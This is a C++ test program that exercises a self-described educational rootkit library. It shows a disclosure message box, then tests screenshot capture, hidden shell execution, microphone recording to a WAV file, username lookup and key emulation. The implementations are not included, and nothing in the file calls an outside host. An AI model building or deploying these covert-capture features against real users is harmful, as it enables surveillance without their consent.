#include <iostream>
#include <windows.h>
#include <vector>
#include <thread>

#include "classes/dll_setup.hpp"

std::vector<std::thread> threads;


void handleTakeScreenshot() {
    std::cout << "Testing 'handleTakeScreenshot'\n";
    if (!takeScreenshot("screenshot.bmp", 0, 0, 300, 300)) {
        std::cout << "\tERROR -> Could not take a screenshot.\n";
        return;
    }
    std::cout << "\tOK -> Took a screenshot.\n\n";
}

void handleQuietShell() {
    std::cout << "Testing 'handleQuietShell'\n";
    std::string res = "";
    if (!quietShell("echo test123", res)) {
        std::cout << "\tERROR -> Could not execute quietShell.\n";
        return;
    }
    std::cout << "\tOK -> Executed quietShell with result:";
    std::cout << "\t" + res + "\n\n";
}

void handleDrawTxt() {
    std::cout << "Testing 'handleDrawTxt'\n";
    drawTxt("Test123", 10, 10, 110, 110, 0, 255, 0, 0, 0, 0, 24);
    std::cout << "\tOK -> drawn text 'Test123'\n\n";
}

void handleShowInputDevices() {
    std::cout << "Testing 'handleShowInputDevices'\n";
    showInputDevices();
    std::cout << "\tOK -> showed list of input devices\n\n";
}

void handleBeginRecording() {
    std::cout << "Testing 'handleBeginRecording'\n";
    int deviceIndex = 0;
    beginRecording("rec_test", deviceIndex, false);
    std::cout << "\tOK -> started recording 'rec_test'\n\n";
}

void handleEndRecording() {
    std::cout << "Testing 'handleEndRecording'\n";
    endRecording("rec_test");
    std::cout << "\tOK -> stopped recording 'rec_test'\n\n";
}

void handleSaveRecording() {
    std::cout << "Testing 'handleSaveRecording'\n";
    saveRecording("rec_test", "rec-test.wav");
    std::cout << "\tOK -> saved recording 'rec_test' to 'rec-test.wav'\n\n";
}

void handleGetUsername() {
    std::cout << "Testing 'handleGetUsername'\n";
    std::cout << "\tOK -> result '" << getUsername() << "'\n\n";
}

void handleGetSelfName() {
    std::cout << "Testing 'handleGetSelfName'\n";
    std::cout << "\tOK -> result '" << getSelfName() << "'\n\n";
}

void handleBeep() {
    std::cout << "Testing 'handleBeep'\n";
    beep("normal");
    Sleep(1000);
    beep("strong");
    Sleep(1000);
    beep("crit");
    std::cout << "\tOK -> played beep test.\n\n";
}

void handleEmulateKey() {
    std::cout << "Testing 'handleEmulateKey'\n";
    emulateKey("win", 10);
    std::cout << "\tOK -> pressed 'win' key.\n\n";
}

int main() {
    std::string msgBoxRes = "";
    msgBox("whiteavocado-public-rootkit", "You are currently running a educational rootkit created by whiteavocado. For educational use ONLY!", "", "w", msgBoxRes);

    handleTakeScreenshot();
    handleQuietShell();
    handleShowInputDevices();
    handleBeginRecording();
    Sleep(5000);
    handleEndRecording();
    handleSaveRecording();
    handleGetUsername();
    handleGetSelfName();
    handleBeep();
    handleEmulateKey();
    return 0;
}
